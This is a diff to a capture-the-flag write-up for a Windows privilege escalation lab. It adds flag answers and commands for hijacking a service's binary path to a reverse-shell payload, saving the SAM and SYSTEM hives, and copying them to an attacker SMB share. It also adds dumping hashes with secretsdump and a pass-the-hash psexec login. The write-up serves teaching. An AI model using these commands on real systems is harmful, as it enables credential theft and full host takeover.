@@ -496,16 +496,19 @@ Go to the Administrator's desktop to retrieve a flag. Don't forget to input the 
 
 * Get the flag on the Administrator's desktop.
 
+	`THM{INSECURE_SVC_CONFIG}`
+
 	* Create and download payload
 	
 		![task5-payload3](./images/task5-payload3.png)
 
 		![task5-download3](./images/task5-download3.png)
 
-	* Set permission
+	* Set permission and change the service's associated executable and account
 	
 		```
 		icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
+		sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
 		```
 
 		![task5-persmission](./images/task5-persmission.png)
@@ -514,6 +517,15 @@ Go to the Administrator's desktop to retrieve a flag. Don't forget to input the 
 
 		![task5-listener3](./images/task5-listener3.png)
 
+	* Restart service 
+	
+		![task5-restart3](./images/task5-restart3.png)
+
+	* Get the resverse shell & the flag
+	
+		`type C:\Users\Administrator\Desktop\flag.txt`
+
+		![task5-admin-flag](./images/task5-svcusr2-flag.png)
 	
 ## Task 6 - Abusing dangerous privileges
 
@@ -680,6 +692,56 @@ Using any of the three methods discussed in this task, gain access to the Admini
 ### Answer the questions below
 
 * Get the flag on the Administrator's desktop.
+
+	`THM{SEFLAGPRIVILEGE}`
+
+	* Check our privileges
+	
+		![task6-check](./images/task6-check.png)
+
+	* Backup the SAM and SYSTEM hashes
+	
+		```
+		reg save hklm\system C:\Users\THMBackup\system.hive
+		reg save hklm\sam C:\Users\THMBackup\sam.hive
+		```
+
+		![task6-backup](./images/task6-backup.png)
+
+	* Setup Impacket `smbserver.py`
+	
+		```
+		mkdir share
+		locate smbserver.py
+		python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+		```
+
+		![task6-smb](./images/task6-smb)
+
+	* Copy file SAM and SYSTEM hashes from target machine to our attacker machine
+	
+		![task6-copy-hive](./images/task6-copy-hive.png)
+
+	* Use Impacket `secretsdump.py` to retrieve the users' password hashes
+	
+		```
+		python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+		```
+
+		![task6-hases](./images/task6-hases.png)
+
+	* Use the Administrator's hash to perform a Pass-the-Hash attack and gain access via Impacket `psexec.py`
+	
+		```
+		python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@$IP
+		```
+
+		![task6-pass-the-hash](./images/task6-pass-the-hash.png)
+
+	* Get the flag
+	
+		![task6-flag](./images/task6-flag.png)
+
 
 ## Task 7 - Abusing vulnerable software
 
